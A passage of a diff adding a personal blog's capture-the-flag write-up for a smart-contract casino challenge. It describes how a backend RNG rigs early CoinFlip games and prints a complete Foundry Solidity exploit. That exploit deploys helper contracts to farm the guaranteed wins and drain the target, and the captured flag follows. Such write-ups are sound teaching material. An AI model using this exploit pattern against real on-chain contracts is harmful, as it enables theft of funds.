+</span></span><span class="line"><span class="cl">            <span class="n">logging</span><span class="o">.</span><span class="n">exception</span><span class="p">(</span><span class="s2">&#34;Unhandled error while scanning; will retry after short sleep&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div><h5 id="my-approach--2">My Approach :</h5>
+<p>The goal of this challenge is to reduce the contract’s balance to <strong>below 10 ETH</strong>.
+Challenge contract starts with <strong>100 ETH</strong>.</p>
+<p>The challenge contract is using the casino_rng.py as a backend service to get the random numbers to resolve the outcomes of the casino games played.</p>
+<p>After analyzing all challenge contract and casino_rng.py :
+Player can play 3 games: CoinFlip,BlackJack and RockPaperScissors</p>
+<p>Each game will be given an unique id using <code>nextBetId</code> counter.
+Each player has also a <code>games</code> counter which maintains the number of games played by the user.</p>
+<p>The mainxum bet that a user can place on a game is 1 Ether and the minimum is 0.1 Ether.</p>
+<p>After analyzing the <code>settleCoinFlip</code> ,<code>settleBlackJack</code> and <code>settleRockPaperScissors</code> functions, these functions can only be called by the backend service.So, I started reading the <code>casino_rng.py</code>.This backend serice is continuously running and try to resolve the games every 1 millisecond.</p>
+<p>In game resolution process, if machine == 1 (means CoinFlip game) and games played by an user &lt;= 3 then rng service gives the resultant random number as even number.</p>
+<p>So,In <code>settleCoinFlip</code> function in challenge contract if the random number generated by rng service is even then outcome is set to true. If outcome is true then the payout amount is doubled as our bet amount.</p>
+<p>In remaining all the game resolutions,the outcomes will occur in probable manner (means each outcome can occur with some probabilty).</p>
+<p>So I focused on the playing <code>settleCoinFlip</code> and its resolution.This will result 2x amount if user games were &lt;= 3 and this is sure event (happens definitely)</p>
+<p>Initially I only have 10 ether.I can bet maximum 1 ether on the game. So,I created the helper contracts which play game instead of me. Each helper contract can play 3 games to get the expected 2x return amount and I impelmented a withdraw function which transfers all the contract balance to my account.</p>
+<p>I followed this pattern.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Iteration</th>
+          <th>no_of_helper_contracts</th>
+          <th>amount_given_to_each_helper_contract</th>
+          <th>helper_contract_returns</th>
+          <th>my_balance</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>1</td>
+          <td>3</td>
+          <td>3 ETH</td>
+          <td>18 ETH</td>
+          <td>19 ETH</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>6</td>
+          <td>3 ETH</td>
+          <td>36 ETH</td>
+          <td>37 ETH</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>12</td>
+          <td>3 ETH</td>
+          <td>72 ETH</td>
+          <td>73 ETH</td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td>10</td>
+          <td>3 ETH</td>
+          <td>60 ETH</td>
+          <td>103 ETH</td>
+      </tr>
+  </tbody>
+</table>
+<p>So,I have initially 10 eth and contract has 100 eth and now I have 103 ether.</p>
+<p>Yay!,I successfully drained the contract with the help of helper contracts.</p>
+<h5 id="riggedssol">Rigged.s.sol</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Script</span><span class="p">,</span> <span class="n">console</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;forge-std/Script.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">Ichal</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">playCoinFlip</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getBalance</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">ISetup</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">TARGET</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span><span class="p">(</span><span class="kt">address</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">RiggedScript</span> <span class="k">is</span> <span class="n">Script</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Ichal</span> <span class="n">chal</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="n">player</span><span class="o">=</span><span class="mh">0x327089AFb5093c4CFd84Fb8Ac1bcE4949aA5A650</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">external</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chal</span> <span class="o">=</span> <span class="n">Ichal</span><span class="p">(</span><span class="n">ISetup</span><span class="p">(</span><span class="mh">0x211C6a12e0548bBB4d86A83C442deF110CA9ba1D</span><span class="p">).</span><span class="n">TARGET</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Challenge contract balance before attack:%e&#34;</span><span class="p">,</span><span class="n">chal</span><span class="p">.</span><span class="n">getBalance</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Player wallet balance intially:%e&#34;</span><span class="p">,</span><span class="n">player</span><span class="p">.</span><span class="nb">balance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="kt">uint8</span> <span class="n">i</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Attack</span> <span class="n">instance</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Attack</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span><span class="mi">3</span> <span class="kc">ether</span><span class="p">}(</span><span class="n">chal</span><span class="p">,</span><span class="n">player</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Attack contract instance %u :%s&#34;</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="kt">address</span><span class="p">(</span><span class="n">instance</span><span class="p">));</span>  <span class="c1">//store all these addresses carefully 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Challenge contract balance after attack:%e&#34;</span><span class="p">,</span><span class="n">chal</span><span class="p">.</span><span class="n">getBalance</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">WithdrawEth</span> <span class="k">is</span> <span class="n">Script</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Ichal</span> <span class="n">chal</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="n">player</span><span class="o">=</span><span class="mh">0x327089AFb5093c4CFd84Fb8Ac1bcE4949aA5A650</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">external</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chal</span> <span class="o">=</span> <span class="n">Ichal</span><span class="p">(</span><span class="n">ISetup</span><span class="p">(</span><span class="mh">0x211C6a12e0548bBB4d86A83C442deF110CA9ba1D</span><span class="p">).</span><span class="n">TARGET</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Player wallet balance before withdraw:%e&#34;</span><span class="p">,</span><span class="n">player</span><span class="p">.</span><span class="nb">balance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="k">memory</span> <span class="n">instances</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x9066d99Ee7a21b08C30eAeC7D4a6Af81A15d988B</span><span class="p">,</span><span class="mh">0x08bF9ddBBEbBCEC0022d1Db02442Ea24CdC3405F</span><span class="p">,</span><span class="mh">0x8E0Cd791F28e1BdB96b1Ef3585d2a19A2e9BDeE0</span><span class="p">,</span><span class="mh">0x1f8f104AFE45dc984F421a36070FC33Bf79a80cf</span><span class="p">,</span><span class="mh">0x03d8c70CC196E216110e1EeAce7e643f2C4F0Cc0</span><span class="p">,</span><span class="mh">0x2469C9A98137Bbb15Ac5EdE74Fe9E2cBcC0E0bBB</span><span class="p">,</span><span class="mh">0x66dabEDB239C0736545FdA6A63c402bC53E1eF22</span><span class="p">,</span><span class="mh">0x779df58BD393041165d5D98432934226d54d9050</span><span class="p">,</span><span class="mh">0x970473d1Ba7291403BF184208a3C01aeC113aAca</span><span class="p">,</span><span class="mh">0x653c86f9Fe2350BBAd3EBE60C34F8Bd3Ea63FDdd</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//withdraw amount from all the instances on which bet is placed
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="kt">uint8</span> <span class="n">i</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Attack</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">instances</span><span class="p">[</span><span class="n">i</span><span class="p">])).</span><span class="n">withdraw</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Player wallet balance after withdraw:%e&#34;</span><span class="p">,</span><span class="n">player</span><span class="p">.</span><span class="nb">balance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Attack</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Ichal</span> <span class="n">chal</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="n">Ichal</span> <span class="n">_chal</span><span class="p">,</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="k">payable</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner</span> <span class="o">=</span> <span class="n">_owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chal</span> <span class="o">=</span> <span class="n">_chal</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chal</span><span class="p">.</span><span class="n">playCoinFlip</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chal</span><span class="p">.</span><span class="n">playCoinFlip</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chal</span><span class="p">.</span><span class="n">playCoinFlip</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//withdraw eth after the attack
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">()</span> <span class="k">external</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">,</span><span class="s">&#34;Not owner&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">payable</span><span class="p">(</span><span class="n">owner</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span><span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>After running this script in each iteration with the updated helper contract addresses,I accessed the flag.</p>
+<p><strong>Flag is :</strong> <code>PP{u51ng_4n_4rmy_15_unf41r::sqglJcY37m2U}</code></p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/d4r3-w0lf" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://x.com/d4r3_w0lf" target="_blank" rel="noopener noreferrer me"
+    title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2025 Nandeesh.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js" ></script>
+
+    
+
+</body>
+</html>
